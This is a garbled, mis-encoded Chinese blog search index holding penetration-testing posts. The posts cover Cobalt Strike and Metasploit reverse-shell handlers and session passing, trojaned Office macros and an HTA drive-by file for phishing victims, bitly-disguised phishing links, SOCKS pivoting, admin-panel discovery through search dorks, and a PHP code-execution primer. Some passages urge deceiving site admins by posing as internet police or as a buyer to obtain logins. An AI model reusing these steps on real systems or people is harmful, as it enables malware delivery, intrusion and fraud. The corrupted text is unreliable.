å¯å‚è€ƒä¸€ä¸ªç½‘å‹çš„åšæ–‡â€”SCå‘½ä»¤ç®¡ç†æœåŠ¡çŠ¶æ€ï¼šhttp://blog.csdn.net/ddjj_1980/article/details/7493045 ç»“åˆmetasploit,åå¼¹shell MSFä¸­use exploit/multi/handlerï¼Œç„¶åset payload windows/meterpreter/reverse_tcpã€set lhostã€set lportï¼›ç„¶åCSä¸­æ–°å»ºç›‘å¬å™¨ï¼›ä¸€ä¸ªtestç¤¾å·¥è‚‰é¸¡è¿è¡Œï¼Œç„¶åæ–°å»ºç›‘å¬å™¨reverse_tcpæ´¾ç”Ÿä¼šè¯ï¼Œrunï¼š æ–°å»ºä¸¤ä¸ªç›‘å¬å™¨ä¸€ä¸ªæ”¾æœ¨é©¬ä¸Šçº¿ åœ¨é¶æœºä¸­ä½¿ç”¨Cobalt Strikeåˆ›å»ºä¸€ä¸ªwindows/foreign/reverse_tcpçš„Listenerã€‚å…¶ä¸­ipä¸ºMetasploitçš„ipåœ°å€ï¼Œç«¯å£ä¸ºMetasploitæ‰€ç›‘å¬çš„ç«¯å£ã€‚ é€‰ä¸­åˆšåˆšæ–°å»ºmsf session -iæŸ¥çœ‹ä¼šè¯ç„¶åsession -i 1è¿›å…¥ æ´¾ç”Ÿç»™reverse_tcpç„¶åExploit officeå®é’“é±¼æ”»å‡»â†’åé—¨â†’MS office ç„¶åå¤åˆ¶æ¶æ„ä»£ç â†’æ’å…¥officeçš„å®ä¸­ï¼Œç¤¾å·¥è‚‰é¸¡æ‰“å¼€å³å¯ MSFä¸­use exploit/multi/handlerï¼Œç„¶åset payload windows/meterpreter/reverse_tcpã€set lhostã€set lportï¼›ç„¶åCSä¸­æ–°å»ºç›‘å¬å™¨ï¼›ä¸€ä¸ªtestç¤¾å·¥è‚‰é¸¡è¿è¡Œï¼Œç„¶åæ–°å»ºç›‘å¬å™¨reverse_tcpæ´¾ç”Ÿä¼šè¯ï¼Œrunï¼šæˆ–ä½¿ç”¨å¦ä¸€ä¸ªç›‘å¬å™¨å¯ä»¥ç›´æ¥åœ¨å›¾å½¢åŒ–ç•Œé¢ä½¿ç”¨ æˆ–ä½¿ç”¨å¦ä¸€ä¸ªç›‘å¬å™¨å¯ä»¥ç›´æ¥åœ¨å›¾å½¢åŒ–ç•Œé¢ä½¿ç”¨ ä¸‹è½½è¿è¡Œåˆ™ä¸­æ‹› Cs ç”Ÿæˆçš„ä»£ç ç›´æ¥æ”¾åˆ°åˆ›å»ºé‡Œé¢å»ï¼Œæ³¨æ„ï¼šåšè¯•éªŒçš„æ—¶å€™ï¼Œå®çš„ä½ç½®ä¸è¦è®¾ç½®æ‰€æœ‰çš„æ´»åŠ¨æ¨¡æ¿å’Œæ–‡æ¡£ï¼Œå»ºè®¾åº”ç”¨åœ¨å½“å‰æ–‡æ¡£ï¼Œä¸ç„¶æœ¬æœºæ‰€æœ‰wordæ–‡æ¡£è¿è¡Œéƒ½ä¼šç§ä¸Šä½ çš„æœ¨é©¬ï¼Œå¦å¤–æ‰“å¼€wordæ–‡æ¡£æœ‰å®æç¤ºï¼Œä¸€èˆ¬æ˜¯wordé»˜è®¤ç¦ç”¨æ‰€æœ‰å®ï¼ˆæ–‡ä»¶â€”é€‰é¡¹â€”ä¿¡ä»»ä¸­å¿ƒâ€”ä¿¡ä»»ä¸­å¿ƒè®¾ç½®é‡Œé¢é…ç½®ï¼‰ã€‚ htaç½‘é¡µæŒ‚é©¬ç¬¬ä¸€æ­¥ï¼šç”Ÿæˆhta ç¬¬äºŒæ­¥ï¼šä½¿ç”¨æ–‡ä»¶ä¸‹è½½ ç‚¹å‡»å¼€å§‹ä¹‹åï¼Œevil.htaæ–‡ä»¶ä¼šè‡ªåŠ¨ä¼ åˆ°cs uploadsç›®å½•ã€‚ å¦‚æœä¹‹å‰è®¾ç½®è¿‡é’“é±¼é¡µé¢ï¼Œè®°å¾—ä¸€å®šè¦åˆ æ‰ï¼Œä¸ç„¶ä¼šå…‹éš†çš„æ—¶å€™ä¼šæŠ¥é”™ æ€»ç»“ï¼š\\1. å…ˆåˆ¶ä½œHTMLï¼šhttp://192.168.1.184:80/test.hta \\2. é’“é±¼æ”»å‡»â†’æ–‡ä»¶ä¸‹è½½ï¼šhttp://192.168.1.184:80/download/file.ext \\3. é’“é±¼æ”»å‡»â†’å…‹éš†ç½‘ç«™ï¼šhttp://192.168.1.184:80/ \\4. ç¤¾å·¥è‚‰é¸¡æ‰“å¼€ï¼š é”®ç›˜è®°å½• é‚®ä»¶é’“é±¼\\1. é‚®ä»¶é’“é±¼ï¼š é™„ä»¶ä¸‹è½½åè¿è¡Œ ä¿¡æ¯æ”¶é›†åˆ¶ä½œå¥½é’“é±¼é¡µé¢ï¼šå¯ä»¥ä½¿ç”¨https://bitly.comåˆ¶ä½œçŸ­ç½‘å€ï¼Œç„¶åè®©å¯¹æ–¹æ‰“å¼€ï¼š ç„¶åè®¾ç½®å¥½è·³è½¬çš„ç½‘å€ ä»¥é€šè¿‡https://bitly.comç”ŸæˆurlçŸ­é“¾æ¥ ï¼ˆï¼‰ socksä»£ç†ï¼šwin7åŒç½‘å¡ï¼šå†…ç½‘ï¼š172.16.2.1 win2003ï¼š172.16.2.2 win7åŒç½‘å¡ 2003å†…ç½‘ï¼š172.16.2.1 MSFä¸­ï¼šsetg Proxies socks4:192.168.1.184:40520ï¼›use auxiliary/scanner/smb/smb_versionï¼›ç„¶åset rhosts 172.16.2.2ï¼›run setg Proxiessocks4:192.168.0.106:6677 ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸‹é¢æ–¹æ³•ï¼š å¼€å¯socks4aä»£ç†ï¼Œé€šè¿‡ä»£ç†è¿›è¡Œå†…ç½‘æ¸—é€ å¼€å¯socksï¼Œå¯ä»¥é€šè¿‡å‘½ä»¤ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å³é”®Pivoting-&gt;SOCKS Server beacon&gt; socks2222 [+] startedSOCKS4a server on: 2222 [+] host calledhome, sent: 16 bytes ç„¶åvim /etc/proxychains.conf ï¼Œåœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ socks4ä»£ç†æœåŠ¡å™¨ ä½¿ç”¨proxychainsä»£ç†æ‰«æå†…ç½‘ä¸»æœº proxychains nmap -sP192.168.183.0/24 å°ç»“ï¼š\\1. CSå¯ä»¥åˆ›å»ºå¤šä¸ªå®¢æˆ·ç«¯ï¼Œæ“ä½œæ–¹ä¾¿ \\2. åŠŸèƒ½æ‰©å±•æ¯”è¾ƒå¤šï¼Œå¦‚ï¼špayloadå¯ä»¥å¤šç§è¯­è¨€ã€‚ \\3. æ”¯æŒå®çš„åŠå…¬è½¯ä»¶éƒ½å¯ä»¥ï¼ˆoffice/WPSï¼‰ \\4. é»˜è®¤å®å®‰å…¨æ€§é«˜/éå¸¸å®‰å…¨ï¼Œè¿è¡Œå®æ—¶ä¼šæç¤ºï¼›ä¸­ä½ä¸ä¼šæç¤ºï¼Œæ‰“å¼€worldæœ‰æç¤ºï¼Œè¯´æ˜å®å¾ˆæœ‰å¯èƒ½æœ‰æœ¨é©¬ã€‚ csææƒä½ ä»¥ä»€ä¹ˆæƒé™è¿è¡Œçš„æœ¨é©¬ï¼Œé‚£ä¹ˆæœ¨é©¬å°†æ‹¥æœ‰æ­¤æƒé™ï¼Œå¦‚æœæƒé™è¿‡ä½æˆ‘ä»¬åªèƒ½è¿›è¡Œææƒã€‚ ææƒæ’ä»¶ä¸‹è½½https://github.com/rsmudge/Elevatekit http://k8gege.org/Download/ https://github.com/k8gege/Aggressor é€‰æ‹©è„šæœ¬ç®¡ç†å™¨å°†ä¸‹è½½å¥½çš„æ’ä»¶æ”¾å…¥è¿›å»ä¸è¦æœ‰ä¸­åˆç›®å½• å†…ç½‘æ¸—é€æ’ä»¶åŠ ä½¿ç”¨æ–¹æ³• https://github.com/k8gege/Aggressor","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"æŸ¥æ‰¾ç½‘ç«™åå°åœ°å€","slug":"æŸ¥æ‰¾ç½‘ç«™åå°åœ°å€","date":"2020-02-20T01:38:23.000Z","updated":"2020-09-20T08:54:12.131Z","comments":true,"path":"2020/02/20/æŸ¥æ‰¾ç½‘ç«™åå°åœ°å€/","link":"","permalink":"https://zhangyanlady.github.io/2020/02/20/%E6%9F%A5%E6%89%BE%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80/","excerpt":"","text":"æˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°è„±è£¤åï¼Œå¾—åˆ°äº†ç®¡ç†å‘˜çš„è´¦å·å’Œå¯†ç åï¼Œæƒ³ç»§ç»­ä¸‹å»çš„æ—¶å€™ï¼Œå°±å¾—æœ‰åå°çš„åœ°å€æ‰èƒ½æ›´æ·±å…¥çš„æ¸—é€ä¸‹å» ä¸€ å­—å…¸æŸ¥æ‰¾æ³• å¤§å®¶è¦å…»æˆä¸€ä¸ªå°å°çš„ä¹ æƒ¯..æŠŠä¸€äº›ä¸Šä¼ çš„åœ°å€..åå°åœ°å€.è¡¨æ®µè®°å½•ä¸‹æ¥..æ˜¯æœ‰å¥½å¤„çš„ï¼Œä¹Ÿå¯ä»¥å»ä¸‹äº›åˆ«äººæ”¶é›†çš„å­—å…¸..é…åˆwwwscan å•ŠD é»‘å®¢åŠ¨ç”»å·´æ˜å°å­æ—æ³¨ä¹‹ç±»çš„å·¥å…·å»æ‰«æ..ä¸è¿‡æˆåŠŸæœºç‡ä¸æ˜¯å¾ˆé«˜(ä¸€èˆ¬ç®¡ç†éƒ½æ˜¯æ ¹æ®è‡ªå·±çš„ä¹ æƒ¯ä¹±å†™çš„) å½“ç„¶æ‰«ä¸‹æ€»æœ‰å¥½å¤„çš„..è¯´ä¸å®šå°±ä¼šæ‰«åˆ°åå°æˆ–ä¸Šä¼ è·¯å¾„.. äºŒ å·¥å…·æ‰«ææ³• å…¶å®ä¸Šé¢ä¹Ÿç”¨åˆ°äº†å·¥å…·.. ä»‹ç»æœ¬äººå¸¸ç”¨çš„å‡ æ¬¾å·¥å…·:é˜¿Dæ³¨å…¥å·¥å…·çš„åå°æ‰«æåŠŸèƒ½,è¿˜æœ‰æ˜å°å­çš„åå°æ‰«æåŠŸèƒ½wwwscanç›®å½•æ‰«æå™¨ å¾¡å‰‘çš„ç›®å½•æ‰«æåŠŸèƒ½ ç­‰ç­‰ã€‚ ä¸‰ æœç´¢å¼•æ“æŸ¥æ‰¾æ³• å…¶å®ä»Šå¤©è¦è¯´çš„å°±æ˜¯è¿™ä¸ªæ–¹æ³•..è¯­æ³•site:www.myhack58.com inurl:xx (å…³é”®å­—)è¿™ä¸ªæ˜¯æˆ‘å¸¸ç”¨çš„..å½“ç„¶è¿™é‡Œæˆ‘ä¹Ÿåªè®²è¿™ä¸€ä¸ª..è¿˜æœ‰å…¶å®ƒçš„..è‡ªå·±å»çœ‹google hack ç»“åˆèµ·æ¥ç”¨..ç”¨å®ä¾‹è®²å¯èƒ½ä¼šå¥½ç‚¹.. ç›®æ ‡: www.myhack58.com Site:www.google.com inurl:asp è¿™å°±æ˜¯åˆ—å‡ºæ‰€æœ‰æ”¶å½•çš„aspé¡µé¢â€¦ç«™å¤§çš„è¯æ‰¾æ­»äºº..ä»è¿™æˆ‘ä»¬å¯ä»¥å»¶ä¼¸å‡ºå»ä¸€ç‚¹..åˆ°æœ‰äº›ç½‘ç«™é‡Œå¯ä»¥æŸ¥åˆ°ç½‘ç«™è¢«ç™¾åº¦ google ç­‰ æ”¶å½•çš„æ‰€æœ‰é¡µé¢ â€¦è¿™é‡Œä¸æäº†..ä½†æ˜¯å¤§å®¶çœ‹ä¸‹.ç«™å¤§çš„è¯æˆ‘ä»¬ç¿»éƒ½è¦ç¿»æ­»åå°ç›¸å…³ä¿¡æ¯çš„æŸ¥æ‰¾ ç”±äºè°·æ­Œè¢«å¤§é™†å±è”½,å¤§å®¶å¯ä»¥ä½¿ç”¨è°·æ­Œç¿»å¢™ï¼Œç™¾åº¦ä¹Ÿæ”¯æŒè¿™äº›è¯­æ³•æœç´¢ã€‚ site:www.google.com intext:ç®¡ç† æ— åˆ©ç”¨ site:www.google.com inurl:login(ç™»é™†çš„é¡µé¢) site:www.google.com intitle:åå° (å¾ˆå®¹æ˜“çš„å°±æ‰¾åˆ°äº†ç½‘ç«™çš„åå°ç™»é™†å£) site:google.com intext:ç®¡ç†|åå°|ç™»é™†|ç”¨æˆ·å|å¯†ç |éªŒè¯ç |ç³»ç»Ÿ|å¸å·|manage|admin|login|system site:google.com inurl:login|admin|manage|manager|admin_login|login_admin|system site:google.com intitle:ç®¡ç†|åå°|ç™»é™†| site:google.com intext:éªŒè¯ç  ã€æŸ¥æ‰¾ç½‘ç«™åå°çš„æ–¹æ³•ã€‘ 1.çŒœè§£å¸¸ç”¨è·¯å¾„ å¸¸ç”¨åå°è·¯å¾„: Admin Adminlogin Admin/admin_login.asp Admin/admin_login.php Manage User System å¤§éƒ¨åˆ†ç½‘ç«™é»˜è®¤éƒ½æ˜¯adminç›®å½•åå°ã€‚ 2.Robots.txt Robotsæ˜¯é˜²æ­¢æœç´¢å¼•æ“æŠ“å–æ•æ„Ÿç›®å½•å’Œæ–‡ä»¶çš„çš„ä¸€ä¸ªæŒ‡å¼•æ–‡ä»¶ã€‚ Admin/ å¾ˆå¤šç®¡ç†å‘˜ä¸ºäº†é˜²æ­¢åå°è¢«æœç´¢å¼•æ“æŠ“å–ï¼Œæ‰€æœ‰ä¼šæŠŠåå°è·¯å¾„æ”¾è¿›robots.txté‡Œ ç±»ä¼¼robots.txt sitemap.xml 3.æ‰«æå·¥å…· å¦‚æœå­—å…¸å†…æœ‰ç›®æ ‡çš„åå°è·¯å¾„ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‰«å‡ºæ¥(å¯èƒ½ä¼šæœ‰å¤æ‚çš„æƒ…å†µï¼Œç¦æ­¢æ‰«æç­‰ ä¸è¿‡å¾ˆå°‘) 4.çˆ¬è¡Œ(Awvs burp suite æ•´ç«™çˆ¬è¡Œå·¥å…·) æ‰«æ:æš´åŠ›çŒœè§£ åˆ©ç”¨å­—å…¸ çˆ¬è¡Œ: è®¿é—®ç½‘ç«™é¦–é¡µï¼š Aç•Œé¢å­˜åœ¨å¾ˆå¤šé“¾æ¥ â€‹ æŠ“å–Aç•Œé¢çš„æ‰€æœ‰é“¾æ¥ï¼Œåˆ†åˆ«å˜æˆB C D ç­‰ç­‰ â€‹ ç»§ç»­æŠ“å–B C Dç•Œé¢ï¼Œä¸€ç›´å¾ªç¯ã€‚ç›´åˆ°çˆ¬è¡Œå®Œã€‚ 5.æŸ¥çœ‹å›¾ç‰‡å±æ€§ ä¸ºä»€ä¹ˆä¼šçˆ†å‡ºåå°è·¯å¾„ï¼Ÿ å½“æˆ‘ä»¬ä¸Šä¼ ç‚¹åœ¨åå°ç›®å½•åé¢ï¼Œå¾ˆæœ‰å¯èƒ½å¯¼è‡´è¿™ç§æƒ…å†µã€‚ ä¸€èˆ¬ç¼–è¾‘å™¨æ”¾åœ¨åå°ç›®å½•åé¢ï¼ŒåŸºæœ¬ä¸Šéƒ½å¯ä»¥ç”¨è¿™ç§æ–¹æ³•æ‰¾åˆ°åå°ã€‚ \\1. è‡ªå¸¦ä¸Šä¼ ç‚¹ \\2. ç¼–è¾‘å™¨ä¸Šä¼ ç‚¹ ä¸Šä¼ ä¼šå¯¼è‡´è¿™ç§æƒ…å†µã€‚ 6.è°·æ­Œè¯­æ³• site:ç›®æ ‡ç«™ intitle:åå° ç®¡ç† ç™»å½• ç®¡ç†å‘˜ ç®¡ç†ä¸­å¿ƒ inurl:admin|login|user site:zlgc.usx.edu.cn 7.ç½‘ç«™ä½ç½®æš´éœ²ç®¡ç†å…¥å£ èƒŒæ™¯: å°¤å…¶æ˜¯å¤šä¸ªç®¡ç†å‘˜çš„ç½‘ç«™ï¼Œä¸€èˆ¬å­¦æ ¡å’Œè¡Œæ”¿å•ä½å±…å¤šã€‚ä¸ºäº†æ–¹ä¾¿ç™»å½•åå°ï¼Œä¼šåœ¨å‰å°ç•™ä¸€ä¸ªå…¥å£ã€‚ 1ã€å·¥å…·è¾…åŠ©æŸ¥æ‰¾ å¦‚å¤§å®¶å¸¸ç”¨çš„:æ˜å°å­ã€å•ŠDã€wwwscan ä»¥åŠä¸€äº›åˆ—ç›®å½•å·¥å…·:Acunetix Web Vulnerability Scanner ã€JSkyã€IntelliTamperã€Netsparkerâ€¦ç­‰ç­‰ ç°åœ¨å¾ˆå¤šç®¡ç†å‘˜éƒ½å­¦ç€æŠŠåå°ç™»é™†é¡µé¢æ”¾å…¶ä»–ä½ç½®ï¼ŒäºŒBçš„å¾ˆï¼ æ¸…å‡‰ç½‘ç«™åå°æ‰«æå™¨ V3.0å†…ç½®çš„åå°æ•°æ®åº“ä¹Ÿéå¸¸çš„å…¨ã€‚ 2ã€ç½‘ç«™èµ„æºåˆ©ç”¨ å¦‚:ç½‘ç«™æ ¹ç›®å½•Robots.txtæ–‡æœ¬ã€å›¾ç‰‡è·¯å¾„çˆ†åå°ã€æŸ¥çœ‹ç½‘ç«™åº•éƒ¨ç‰ˆæƒä¿¡æ¯æ˜¯å¦æœ‰è¿æ¥ã€é€šè¿‡ç½‘ç«™é‡Œçš„æ–‡ä»¶åæŸ¥è¯¢æºç ä¸‹è½½å¾—çŸ¥ 3ã€æœç´¢å¼•æ“æŸ¥è¯¢ å‘½ä»¤å¾ˆå¤šç§åˆ—å‡ ç§è‡ªå·±å¸¸ç”¨çš„å§: site:sfz.1ri.me intext:ç®¡ç†|åå°|ç™»é™†|ç”¨æˆ·å|å¯†ç |éªŒè¯ç |ç³»ç»Ÿ|å¸å·|manage|admin|login|system site:sfz.1ri.me inurl:login|admin|manage|manager|admin_login|login_admin|system site:sfz.1ri.me intitle:ç®¡ç†|åå°|ç™»é™†| site:sfz.1ri.me intext:éªŒè¯ç  4ã€ç¤¾ä¼šå·¥ç¨‹å­¦ çŒœå§â€¦ å¦‚:å‰æ®µæ—¶é—´çš„CCTV http://chinvan.cctv.com/ChinvanAdmin/login.aspx çœ‹å‡ºä»€ä¹ˆæ²¡æœ‰è¿™æ ·çš„æƒ…å†µç»å¸¸èƒ½ç¢°åˆ°å°±æ˜¯åŸŸå+admin www.sfz.1ri.me hackseoadmin hackseo_admin hackseomanage adminhackseoç­‰ç­‰ æˆ–è€…æ³¨å…¥çš„æ—¶å€™è¿˜å¯ä»¥æ ¹æ®æ•°æ®åº“é‡Œçš„ä¸€äº›æ•æ„Ÿåå­—çŒœç®¡ç†åœ°å€ï¼Œä¾‹å¦‚lzè¯´çš„hackseo_adminã€‚ è¿™ä¸ªè¦çœ‹è¿æ°”äº†,ç¥å¤§å®¶å¥½è¿~ â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” ç›´æ¥é—®ç®¡ç†å‘˜ï¼šä½ ä»¬åå°åœ°å€æ˜¯å¤šå°‘ï¼Œæˆ‘è¯•è¯•èƒ½è¿›å»ä¸ï¼Ÿæœ‹å‹å‘Šè¯‰æˆ‘ä½ ä»¬ç½‘ç«™çš„å¯†ç æ˜¯admin admin çŒ¥ççš„ï¼šæ³¨å†Œä¸ªä¼šå‘˜å‘è¡¨ä¸ªååŠ¨æ–‡ç« ï¼Œç„¶ååŠ ç®¡ç†qqï¼Œç„¶åä½ å°±è¯´æˆ‘æ˜¯ç½‘ç›‘ï¼ŒæŠŠè¿™æ¡æ–°é—»åˆ äº†ã€‚ç»™æˆ‘åŠ ä¸ªç®¡ç†å‘˜ï¼Œæ–¹ä¾¿æˆ‘ä»¥åè‡ªå·±åˆ â€¦â€¦ï¼ˆæˆ‘ä»¥å‰åšç«™å°±é‡åˆ°è¿‡ï¼‰ï¼Œæ­¤æ–¹æ³•t00lsé¦–å‘ï¼Œå¦‚æœ‰äººåˆ©ç”¨æ­¤æ–¹æ³•è¿æ³•ï¼Œæœ¬äººä¸æ‰¿æ‹…è´£ä»»ã€‚ â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” åŠ ç®¡ç†å‘˜QQï¼Œè¯´è¦ä¹°ä»–ç½‘ç«™ç¨‹åºçš„æºç ï¼Œä»·é’±å‡ºé«˜ç‚¹ï¼Œè®©ç®¡ç†åŠ¨å¿ƒï¼Œç„¶åè®©ä»–ç»™ä¸ªåå°å’Œç”¨æˆ·å¯†ç è¿›åå°çœ‹åŠŸèƒ½ã€‚ã€‚å¦‚æœä»–ä¸åŒæ„å°±è®©ä»–QQè¿œç¨‹ï¼Œè¿™ä»–åº”è¯¥ä¼šåŒæ„çš„ã€‚ã€‚ã€‚ç„¶åä½ å°±å¾—åˆ°åå°åœ°å€äº†ã€‚ã€‚ã€‚å˜»å˜»ï¼Œé‡‘é’±è¯±æƒ‘ã€‚ã€‚ã€‚","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"ä»£ç æ‰§è¡Œä¸ååºåˆ—åŒ–","slug":"ä»£ç æ‰§è¡Œä¸ååºåˆ—åŒ–","date":"2020-02-12T12:05:09.000Z","updated":"2020-09-20T08:55:10.284Z","comments":true,"path":"2020/02/12/ä»£ç æ‰§è¡Œä¸ååºåˆ—åŒ–/","link":"","permalink":"https://zhangyanlady.github.io/2020/02/12/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"æ€»ç»“å›¾ è¿œç¨‹å‘½ä»¤æ‰§è¡ŒåŸç†ï¼šåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£ï¼Œæ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Š ä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚è€Œå¦‚æœè®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤â€œæ„æƒ³ä¸åˆ°â€çš„å‘½ä»¤ï¼Œä»è€Œè®©åå°è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨ã€‚ è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åŸç†ï¼šä¸ºéœ€æ±‚è®¾è®¡,åå°æœ‰æ—¶å€™ä¹Ÿä¼šæŠŠç”¨æˆ·çš„è¾“å…¥ä½œä¸ºä»£ç çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ‰§è¡Œ,ä¹Ÿå°±é€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ä¸ç®¡æ˜¯ä½¿ç”¨äº†ä»£ç æ‰§è¡Œçš„å‡½æ•°,è¿˜æ˜¯ä½¿ç”¨äº†ä¸å®‰å…¨çš„ååºåˆ—åŒ–ç­‰ç­‰ã€‚ â€‹ å› æ­¤ï¼Œå¦‚æœéœ€è¦ç»™å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„APIæ¥å£ï¼Œä¸€å®šéœ€è¦å¯¹æ¥å£è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œæ¯”å¦‚å®æ–½ä¸¥æ ¼çš„ç™½åå•ç­–ç•¥ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ³•ã€‚ phpæ‰§è¡Œç³»ç»ŸåŠä»£ç å‘½ä»¤å¸¸ç”¨å‡½æ•°1ï¼‰æ‰§è¡Œç³»ç»Ÿå‘½ä»¤: assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``(åå•å¼•å·ï¼‰ PHPæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æœ‰å‡ ä¸ªå¸¸ç”¨çš„å‡½æ•°,å¦‚æœ‰:systemå‡½æ•°ã€execå‡½æ•°ã€popenå‡½æ•°,passthru,shell_execå‡½æ•°ä»–ä»¬éƒ½å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤,ä¸è¿‡å‰ææ—¶å¿…é¡»ç³»ç»Ÿç»™äº†æƒé™äº†å“¦ã€‚ systemå‡½æ•° è¯´æ˜ï¼šæ‰§è¡Œå¤–éƒ¨ç¨‹åºå¹¶æ˜¾ç¤ºè¾“å‡ºèµ„æ–™ã€‚ è¯­æ³•ï¼šstring system(string command, int [return_var]); è¿”å›å€¼: å­—ç¬¦ä¸²è¯¦ç»†ä»‹ç»ï¼šæœ¬å‡½æ•°å°±åƒæ˜¯ C è¯­ä¸­çš„å‡½æ•° system(),ç”¨æ¥æ‰§è¡ŒæŒ‡ä»¤,å¹¶è¾“å‡ºç»“æœ,è‹¥æ˜¯ return_var å‚æ•°å­˜åœ¨,åˆ™æ‰§è¡Œ command ä¹‹åçš„çŠ¶æ€ä¼šå¡«å…¥ return_var ä¸­,åŒæ ·å€¼å¾—æ³¨æ„çš„æ˜¯è‹¥éœ€è¦å¤„ç†ç”¨æˆ·è¾“å…¥çš„èµ„æ–™,è€Œåˆè¦é˜²æ­¢ç”¨æˆ·è€èŠ±æ‹›ç ´è§£ç³»ç»Ÿ,åˆ™å¯ä»¥ä½¿ç”¨ EscapeShellCmd(),è‹¥ PHP ä»¥æ¨¡å—å¼çš„æ‰§è¡Œ,æœ¬å‡½æ•°ä¼šåœ¨æ¯ä¸€è¡Œè¾“å‡ºåè‡ªåŠ¨æ›´æ–° Web æœåŠ¡å™¨çš„è¾“å‡ºç¼“å†²æš‚å­˜åŒº,è‹¥éœ€è¦å®Œæ•´çš„è¿”å›å­—ç¬¦ä¸²,ä¸”ä¸æƒ³ç»è¿‡ä¸å¿…è¦çš„å…¶å®ƒä¸­é—´çš„è¾“å‡ºç•Œé¢,å¯ä»¥ä½¿ç”¨ PassThru()ã€‚ execå‡½æ•° è¯´æ˜ï¼šæ‰§è¡Œå¤–éƒ¨ç¨‹åºã€‚ è¯­æ³•ï¼šstring exec(string command, string [array], int [return_var]); è¿”å›å€¼: å­—ç¬¦ä¸² è¯¦ç»†ä»‹ç»ï¼šæœ¬å‡½æ•°æ‰§è¡Œè¾“å…¥ command çš„å¤–éƒ¨ç¨‹åºæˆ–å¤–éƒ¨æŒ‡ä»¤ã€‚å®ƒçš„è¿”å›å­—ç¬¦ä¸²åªæ˜¯å¤–éƒ¨ç¨‹åºæ‰§è¡Œåè¿”å›çš„æœ€åä¸€è¡Œï¼›è‹¥éœ€è¦å®Œæ•´çš„è¿”å›å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä½¿ç”¨PassThru() è¿™ä¸ªå‡½æ•°ã€‚ è¦æ˜¯å‚æ•° array å­˜åœ¨ï¼Œcommand ä¼šå°† array åŠ åˆ°å‚æ•°ä¸­æ‰§è¡Œï¼Œè‹¥ä¸æ¬² array 